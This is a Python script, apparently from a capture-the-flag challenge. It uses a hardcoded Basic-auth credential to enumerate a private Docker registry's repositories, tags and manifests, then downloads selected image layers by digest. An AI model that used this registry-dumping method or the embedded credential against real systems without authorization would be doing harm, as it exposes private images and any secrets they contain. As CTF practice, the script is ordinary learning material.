import requests
import tarfile
import re

sus = [
  "sha256:41df43981f1fc47506c90b1f4cf099af53bc88b1e2f9117e3ff1a7526e171a25",
  "sha256:cc1e9486f9fbc00fb03665376904b226279d85fcd0d6c814519e91aca20f912a",
  "sha256:9e4a604921153e013d9c44466440dea5124caa030b6be60c35c8910a947fcd20",
  "sha256:bea0a24cc570b27609624b399c4685c8987e55be97d77e6dff3f1381154deecd",
  "sha256:a8529e4999a8bb5fc670190d829423b64b04ecfd7d4e6ecb3d57818cfb58304a",
  "sha256:670466dbfe412db824b195895af2b8caeb84a4cc8a0673701ed42efefda2477c",
]

r = requests.get(
    url="https://devhole.hfctf.ca:8888/v2/_catalog",
    headers={
        "Authorization": "Basic cHJpdmF0ZV9yZWFkOnZ0OWdzaFlCS3c1aFVrNEtXOTBi",
    },
)
manifest = r.json()
print(manifest)

def download_file(url):
    local_filename = url.split('/')[-1]
    # NOTE the stream=True parameter below
    with requests.get(url, stream=True, headers={"authorization": "Basic cHJpdmF0ZV9yZWFkOnZ0OWdzaFlCS3c1aFVrNEtXOTBi",}) as r:
        r.raise_for_status()
        with open(local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                # If you have chunk encoded response uncomment if
                # and set chunk_size parameter to None.
                #if chunk:
                f.write(chunk)
    return local_filename
parts = {}
for repo in manifest["repositories"]:
  repo_tags = requests.get(
    url=f"https://devhole.hfctf.ca:8888/v2/{repo}/tags/list",
    headers={
        "Authorization": "Basic cHJpdmF0ZV9yZWFkOnZ0OWdzaFlCS3c1aFVrNEtXOTBi",
    },
  )
  tags = repo_tags.json()
  for tag in tags["tags"]:
    image_manifest = requests.get(
      url=f"https://devhole.hfctf.ca:8888/v2/{repo}/manifests/{tag}",
      headers={
        "Authorization": "Basic cHJpdmF0ZV9yZWFkOnZ0OWdzaFlCS3c1aFVrNEtXOTBi",
      },
    )
    image_manifest_json = image_manifest.json()
    for layer in image_manifest_json["fsLayers"]:
      name = layer["blobSum"]
      if name in sus:
        print(f"Downloading {name}")
        download_file(f"https://devhole.hfctf.ca:8888/v2/{repo}/blobs/{name}")
      else:
        print(f"Ignoring {name}")